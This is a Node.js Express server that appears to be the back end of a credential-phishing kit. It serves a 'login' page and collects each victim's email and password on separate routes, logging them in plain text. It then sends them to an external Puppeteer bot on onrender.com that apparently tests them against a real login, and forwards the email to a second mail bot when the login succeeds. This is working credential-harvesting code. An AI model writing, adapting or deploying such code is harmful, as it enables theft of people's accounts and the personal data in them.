const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 6282;

const bot1 = 'https://puppeteer-9swz.onrender.com/login';
const bot2 = 'https://mail-bot.onrender.com/mail';

app.use(cors());
app.use(bodyParser.json());

let userData = {};

// Route to receive the email
app.post('/email', async (req, res) => {
  userData.email = req.body.email;
  console.log('Received email:', userData.email);
  res.json({ message: 'Email received successfully' });
});

// Route to receive the password
app.post('/psswd', async (req, res) => {
  userData.password = req.body.password;
  console.log('Received password:', userData.password);
  res.json({ message: 'Password received successfully' });
});

// Serve static files from the 'login' directory
app.use(express.static(path.join(__dirname, 'login')));

// Route to send email and password to another API
app.post('/bhenchod', async (req, res) => {
  if (userData.email && userData.password) {
    try {
      const response = await axios.post(bot1, userData);
      console.log('Data sent to /login RES:', response.data);
      res.status(response.status).json(response.data);  // Send the response status and data to the client

      //mail send if bot response stauts is 200

      let emailSend = response.status;

      if (emailSend === 200) {
        axios.post(bot2, userData.email, {
            headers: { 'Content-Type': 'text/plain' }
        })
        .then(response => {
            console.log('Mail sent:', response.data);
        })
        .catch(error => {
            console.error('Error sending mail:', error);
        });
      }
    }

// other bakchodi if email is not valid
      
    catch (error) {
      console.error('Error sending data to /login:', error);
      if (error.response) {
        // Ensure error response data is valid before checking
        const checker = error.response.data;

        // Check for specific messages and send appropriate status codes
        if (checker === 'Incorrect password') {
          res.sendStatus(401);
        } else if (checker === 'Incorrect email') {
          res.sendStatus(402);
        } else {
          // Fallback for any other errors not explicitly handled
          res.status(500).json({ message: 'Unexpected error from API' });
        }
      } else {
        // Network or other error, send a 500 status
        res.status(500).json({ message: 'Internal Server Error' });
      }
    }
  } else {
    console.log("Email and password must be provided");
    res.status(400).json({ message: 'Email and password must be provided' });  // Changed to 400 for bad input
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
